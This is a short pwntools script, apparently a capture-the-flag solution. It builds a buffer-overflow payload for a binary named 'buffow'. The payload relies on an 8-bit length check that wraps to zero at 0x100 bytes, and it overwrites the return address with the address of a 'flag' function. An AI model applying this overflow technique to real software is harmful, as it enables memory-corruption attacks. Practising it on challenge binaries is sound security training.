from pwn import *
elf = ELF('./buffow', checksec=False)
# al = 8/8 => 1 byte
# 0x100 will return 0x00
# 0x08049211      3c34           cmp al, 0x34                ; 52
payload = b''.join([
    cyclic(0x34),
    p32(elf.sym['flag']),
    cyclic(0x100-0x34-4)
])
print(payload.decode())